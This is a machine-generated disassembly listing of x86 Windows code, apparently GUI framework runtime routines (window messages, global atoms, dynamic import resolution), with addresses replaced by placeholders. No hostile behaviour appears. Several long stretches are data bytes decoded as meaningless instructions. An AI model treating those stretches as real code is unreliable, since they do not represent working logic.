push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_43e930
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_4068ac
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_43e958
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43e8cc
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_43e980
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_43e8e4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_43e900
pop ebx
retn
mov eax ebx
call sub_43e930
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_43e9e4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43eb4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_43ec68
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_43ec4c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_43ec4c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_43ed58
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4030f0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4030f0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4030f0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4030f0
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eac
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eac
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43ede0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ef58
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408940
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f00
mov eax [ rw-data ]
call sub_40436c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408940
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f00
mov eax [ rw-data ]
call sub_40436c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40436c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
call sub_43e9e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_43e80c
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_450bc4
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_451ca8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_453890
mov ecx r-xdata
mov edx sub_430a80
mov eax [ r-xdata ]
call sub_413228
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ef5f
lea eax [ ebp - 0x10 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_43efc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43f027
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f02e
retn
mov eax rw-data
call sub_40cb14
call sub_43ed58
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_403eac
sub_43f030
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43f0b6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f0bd
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_43ede0
mov eax [ r-xdata ]
call sub_41309c
mov eax [ r-xdata ]
call sub_41313c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
sub_43f280
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor bl dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ edx ] bl
inc ebx
add [ eax ] ch
add [ eax ] al
sub al 0x21
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x59fffc0 ] ah
inc ebx
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add [ ebx + edi * 8 - 0x6093ffbd ] al
inc ecx
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x60bffbf ] bl
inc ebx
add [ eax ] cl
cld
inc ebx
add [ ebx + edi * 8 + 0x43 ] al
add [ eax + eax ] al
std
sub_43f304
stc
push ebx
push eax
push [ eax - 0x7ffbc06 ]
cli
inc ebx
add ah bh
cld
inc ebx
add [ edi * 8 + 0x54110043 ] bl
inc ebx
jne r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x59fffc0 ] ah
inc ebx
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
in al 0xf1
inc ebx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sub al 0xf3
inc ebx
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x7400006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
xor al 0x33
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
cmc
inc ebx
add [ eax ] dh
add [ eax ] al
add [ eax + 0x20004118 ] bh
xor eax [ eax ]
sub al 0x33
inc eax
arpl [ ebp + 0x74 ] si
pushad
push cs
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
inc [ ecx ]
inc ebx
add [ eax ] bl
add bh bh
cmp al 0xfd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
pushad
push cs
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ edi + ebx * 4 + 0x41 ] bl
add [ ebx + edi * 8 - 0x6093ffbd ] al
inc ecx
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x60bffbf ] bl
inc ebx
add [ eax ] cl
cld
inc ebx
add [ ebx + edi * 8 + 0x43 ] al
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add [ esi + edi + 0x41 ] bl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sub [ edx ] ah
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xf3a40000
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
inc ebx
add [ eax + esi - 0xd7ffc0 ] ah
inc ebx
add [ eax - 0x1 ] bh
inc ebx
jne r-xdata
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x52500040 ] ah
je r-xdata
add [ eax ] ch
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
fdivr st3
inc ebx
inc ebx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
inc eax
add [ eax ] ch
inc [ ebx ]
js r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0xf5dcc08b
inc ebx
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ edi + eax * 2 ] ah
inc ecx
add [ esi + eax * 2 ] bl
inc ecx
add al bh
push esp
inc ecx
add [ edx * 2 + 0x55300041 ] ch
xor eax [ eax ]
sub [ ebx ] dh
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
push eax
push edx
inc ebx
push 0x65676e61
in al 0xf1
inc ebx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
inc [ ebx ]
test [ esi + 0x3e5c0041 ] bl
inc ebx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
add [ eax + 0x480041a4 ] bh
clc
inc ebx
add [ esp + eax + 0x44 ] al
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x12bffbf ] bl
inc ebx
add [ eax - 0x5b ] bh
inc ecx
add [ 0xffffffffa4b00041 ] bl
inc ecx
add al ah
movsb [ edi ] [ esi ]
inc ecx
add [ esp - 0x663ffbf ] dh
inc ebx
add [ edx + eax + 0x44 ] ch
add [ edx + eax ] al
inc esp
add [ eax + 0x5 ] al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
pop esp
lahf
inc ecx
inc ebx
jne r-xdata
inc ecx
add [ edx * 2 + 0x4a080041 ] dh
inc ecx
add [ eax + 0x4004156 ] ch
push edi
inc ecx
add al bl
push edi
inc ecx
add al cl
push eax
inc ecx
add [ eax + ebx * 2 ] dl
inc ecx
add [ eax + 0x4c004158 ] cl
add eax 0x52b80044
inc ecx
add [ ebp + eax * 2 + 0x41 ] ah
add [ ebx + edx * 2 + 0x41 ] dl
add [ ebx + edx * 2 + 0x54000041 ] dl
inc ecx
add [ ecx + ecx * 2 + 0x55900041 ] dh
inc ecx
add [ ebx + ecx * 2 + 0x4c900041 ] bh
inc ecx
add ah cl
push ebp
inc ecx
add ah bl
push ebp
inc ecx
add ah dh
dec esp
inc ecx
add [ eax + 0x4d ] cl
inc ecx
add ah dh
dec ebp
inc ecx
add [ edi + ecx * 2 + 0x4fe40041 ] cl
inc ecx
add [ eax + 0x50 ] bh
inc ecx
add [ ebx + edx * 2 ] bl
inc ecx
add [ eax ] bh
push ebx
inc ecx
add [ eax ] dh
push esi
inc ecx
add [ eax + 0x40004154 ] al
pop eax
inc ecx
add [ eax + 0x58 ] dl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ eax ] dh
push ebp
popad
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
test al 0x19
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xf64c0000
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffbc0a ] ah
test [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
test [ ebx ] 0xd0
test [ ebx ] 0xa0
add [ eax ] al
add al al
lea eax [ eax ]
xor ch dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
cmc
inc ebx
sub_43f604
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffe40043f6 ]
test [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
test [ ebx ] 0xd0
test [ ebx ] 0xa0
add [ eax ] al
add al al
sub_43f6c6
out dx eax
call [ eax - 0x47ffbbfc ]
add al 0x44
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
push 0x640041a3
mov [ 0xffffffffa39c0041 ] eax
inc ecx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
in al 0xf6
inc ebx
add [ edi ] al
or eax 0x73754354
je r-xdata
add ah bh
mov [ 0xffffffffa3d00041 ] eax
inc ecx
add [ eax ] al
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa3b40041 ] eax
inc ecx
add [ eax ] cl
movsb [ edi ] [ esi ]
inc ecx
add ah bl
std
inc ebx
add al dh
std
inc ebx
add [ esi + edi * 8 ] al
inc ebx
add [ eax ] bl
inc [ ebx ]
sub al 0xfe
inc ebx
add [ eax - 0x2 ] al
inc ebx
add [ esi + edi * 8 + 0x43 ] dl
add [ eax - 0x2 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] bh
add [ eax - 0x5bffbc02 ] dl
inc [ ebx ]
test al 0xfe
inc ebx
add [ esi + edi * 8 - 0x14fffbd ] ch
inc ebx
add [ esi + edi * 8 - 0x147ffbd ] dh
inc ebx
add [ esi + edi * 8 - 0x13fffbd ] bh
inc ebx
add ah al
inc [ ebx ]
enter 0x43fe 0x0
int3
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
test [ ebx ] 0x94
int1
inc ebx
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xf7540000
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
test [ ebx ] 0x18
mov [ edx ] fs
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5c97ffc0 ] ah
inc ecx
add [ ebx + 0x41 ] ah
add [ ebx - 0x5c03ffbf ] bl
inc ecx
add al dl
mov [ 0xffffffffa4000041 ] eax
sub_43f7d8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a458
test bl bl
jle r-xdata
mov edx esi
call sub_43fbec
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_43f848
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419f6c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_43f8f0
sub_43f87c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f80c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413750
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_4138dc
sub_43f8c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4042b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f00
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_43f8f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_43fbec
mov edx ebx
mov eax esi
call sub_43fbcc
sub_43f918
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43f8f0
sub_43f944
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45465c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4032ec
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a4e4
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_4308ac
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f99c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_454684
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4032ec
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a500
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_4308ac
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f9f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419b0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43fb78
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_43fa60
push ebx
push esi
push edi
call sub_403464
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4030f0
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413948
call sub_4030f0
mov eax [ edi + 0x30 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419b58
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
sub_43fab0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43faf8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4138bc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov edx edi
call sub_43f87c
sub_43fb44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_4413e8
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44142c
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419bdc
sub_43fb84
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419e28
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_43fbec
sub_43fbcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413704
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419bdc
pop esi
pop ebx
retn
sub_43fbec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4139fc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_43fc08
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_43fc70
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44a4e4
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_442c84
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_440518
mov edx ebp
call sub_440578
inc eax
je r-xdata
sub_43fcfc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_43fd1c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
